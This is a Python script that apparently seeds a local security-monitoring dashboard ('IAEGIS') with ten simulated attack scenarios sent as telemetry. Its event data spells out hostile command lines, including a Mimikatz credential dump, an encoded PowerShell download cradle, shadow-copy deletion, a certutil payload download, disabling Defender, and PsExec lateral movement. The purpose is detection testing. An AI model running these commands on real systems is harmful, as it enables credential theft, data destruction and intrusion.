"""
IAEGIS Attack Scenario Injector
Fires 10 realistic attack scenarios to populate the dashboard.
Usage: python tools/inject_scenarios.py
"""
import requests, json, time, sys, uuid
from datetime import datetime, timezone, timedelta

URL    = "http://localhost:8000"
APIKEY = "iaegis-dev-agent-key"
AGENT  = f"demo-{uuid.uuid4().hex[:8]}"
HOST   = "DESKTOP-VICTIM01"

S = requests.Session()
S.headers.update({"X-API-Key": APIKEY, "Content-Type": "application/json"})

SCENARIOS = [
  {"name":"Mimikatz Credential Dump","sev":"CRITICAL","events":[
    {"event_type":"file_write","data":{"path":"C:\\Users\\sandh\\AppData\\Local\\Temp\\mimi.exe","process_name":"cmd.exe","pid":4421,"size_bytes":1245184}},
    {"event_type":"process_start","data":{"process_name":"mimikatz.exe","cmdline":"mimikatz.exe privilege::debug sekurlsa::logonpasswords exit","pid":5521,"ppid":4421,"parent_name":"cmd.exe","username":"sandh"}},
  ]},
  {"name":"PowerShell Download Cradle from Word","sev":"CRITICAL","events":[
    {"event_type":"process_start","data":{"process_name":"powershell.exe","cmdline":"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABjAD0ATgBlAHcA","pid":7823,"ppid":3912,"parent_name":"winword.exe","username":"sandh"}},
    {"event_type":"network_connection","data":{"process_name":"powershell.exe","pid":7823,"dst_host":"185.220.101.47","dst_port":443,"remote_address":"185.220.101.47","status":"ESTABLISHED"}},
    {"event_type":"file_write","data":{"path":"C:\\Users\\sandh\\AppData\\Local\\Temp\\payload.exe","process_name":"powershell.exe","pid":7823,"size_bytes":892416}},
  ]},
  {"name":"Ransomware — Shadow Copy Deletion","sev":"CRITICAL","events":[
    {"event_type":"process_start","data":{"process_name":"cmd.exe","cmdline":"cmd.exe /c vssadmin delete shadows /all /quiet","pid":9012,"ppid":8001,"parent_name":"svchost.exe","username":"sandh"}},
    {"event_type":"process_start","data":{"process_name":"cmd.exe","cmdline":"bcdedit /set {default} recoveryenabled No","pid":9013,"ppid":8001,"parent_name":"svchost.exe","username":"sandh"}},
    {"event_type":"process_start","data":{"process_name":"cmd.exe","cmdline":"wbadmin delete catalog -quiet","pid":9014,"ppid":8001,"parent_name":"svchost.exe","username":"sandh"}},
  ]},
  {"name":"CertUtil LOLBAS File Download","sev":"HIGH","events":[
    {"event_type":"command_exec","data":{"process_name":"certutil.exe","cmdline":"certutil.exe -urlcache -split -f http://192.168.56.101:8080/beacon.exe C:\\Windows\\Temp\\svc.exe","pid":6610,"ppid":5500,"parent_name":"cmd.exe","username":"sandh"}},
    {"event_type":"file_write","data":{"path":"C:\\Windows\\Temp\\svc.exe","process_name":"certutil.exe","pid":6610,"size_bytes":512000}},
  ]},
  {"name":"Reverse Shell Port 4444","sev":"HIGH","events":[
    {"event_type":"network_connection","data":{"process_name":"svchost.exe","pid":1122,"dst_host":"10.10.10.99","dst_port":4444,"remote_address":"10.10.10.99","status":"ESTABLISHED"}},
  ]},
  {"name":"Startup Folder Persistence","sev":"HIGH","events":[
    {"event_type":"file_write","data":{"path":"C:\\Users\\sandh\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe","process_name":"powershell.exe","pid":7823,"size_bytes":892416}},
  ]},
  {"name":"SharpHound AD Enumeration","sev":"HIGH","events":[
    {"event_type":"process_start","data":{"process_name":"SharpHound.exe","cmdline":"SharpHound.exe -c All --zipfilename loot.zip","pid":3344,"ppid":2211,"parent_name":"cmd.exe","username":"sandh"}},
    {"event_type":"network_connection","data":{"process_name":"SharpHound.exe","pid":3344,"dst_host":"192.168.1.10","dst_port":389,"remote_address":"192.168.1.10","status":"ESTABLISHED"}},
  ]},
  {"name":"PsExec Lateral Movement","sev":"HIGH","events":[
    {"event_type":"process_start","data":{"process_name":"PsExec.exe","cmdline":"PsExec.exe \\\\192.168.1.20 -u Administrator cmd.exe","pid":8871,"ppid":4421,"parent_name":"cmd.exe","username":"sandh"}},
    {"event_type":"network_connection","data":{"process_name":"PsExec.exe","pid":8871,"dst_host":"192.168.1.20","dst_port":445,"remote_address":"192.168.1.20","status":"ESTABLISHED"}},
  ]},
  {"name":"Windows Defender Disabled","sev":"CRITICAL","events":[
    {"event_type":"command_exec","data":{"process_name":"powershell.exe","cmdline":"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true","pid":9900,"ppid":8800,"parent_name":"cmd.exe","username":"sandh"}},
  ]},
  {"name":"ngrok C2 Tunnel","sev":"MEDIUM","events":[
    {"event_type":"process_start","data":{"process_name":"ngrok.exe","cmdline":"ngrok.exe tcp 4444","pid":5544,"ppid":4421,"parent_name":"cmd.exe","username":"sandh"}},
    {"event_type":"network_connection","data":{"process_name":"ngrok.exe","pid":5544,"dst_host":"tunnel.us.ngrok.io","dst_port":443,"remote_address":"tunnel.us.ngrok.io","status":"ESTABLISHED"}},
  ]},
]

def check():
    try: return S.get(f"{URL}/health", timeout=5).status_code == 200
    except: return False

def register():
    try:
        r = S.post(f"{URL}/api/v1/agents/register", json={"id":AGENT,"hostname":HOST,"ip_address":"192.168.1.55","os_name":"Windows","os_version":"10.0.19045","agent_version":"2.0.0"}, timeout=5)
        return r.status_code in (200,201)
    except: return False

def inject(scenario):
    total = 0
    now = datetime.now(timezone.utc)
    print(f"\n  [{scenario['sev']}] {scenario['name']}", end="", flush=True)
    for i, evt in enumerate(scenario["events"]):
        try:
            r = S.post(f"{URL}/api/v1/telemetry/ingest", json={"agent_id":AGENT,"event_type":evt["event_type"],"timestamp":(now+timedelta(seconds=i)).isoformat(),"data":evt["data"],"hostname":HOST}, timeout=10)
            if r.status_code == 202: total += r.json().get("detections",0)
            time.sleep(0.15)
        except Exception as e:
            print(f"\n  ERROR: {e}"); return
    print(f" → {total} detection(s) fired")

if __name__ == "__main__":
    print("\n╔══════════════════════════════════════════╗")
    print("║   IAEGIS Attack Scenario Injector       ║")
    print("╚══════════════════════════════════════════╝")
    print(f"\nChecking backend at {URL}...", end="", flush=True)
    if not check():
        print(" OFFLINE\n\nStart backend first: run start_backend.bat\n"); sys.exit(1)
    print(" Online")
    print(f"Registering demo agent [{HOST}]...", end="", flush=True)
    print(" OK" if register() else " Failed (continuing)")
    print(f"\nInjecting {len(SCENARIOS)} attack scenarios:\n{'─'*44}")
    for i, s in enumerate(SCENARIOS):
        print(f"[{i+1}/{len(SCENARIOS)}]", end="")
        inject(s)
        time.sleep(0.3)
    print(f"\n{'─'*44}")
    print("\n✓ Done! Open http://localhost:3000 to see the dashboard")
    print("  → Detections: http://localhost:3000/detections")
    print("  → Incidents:  http://localhost:3000/incidents\n")
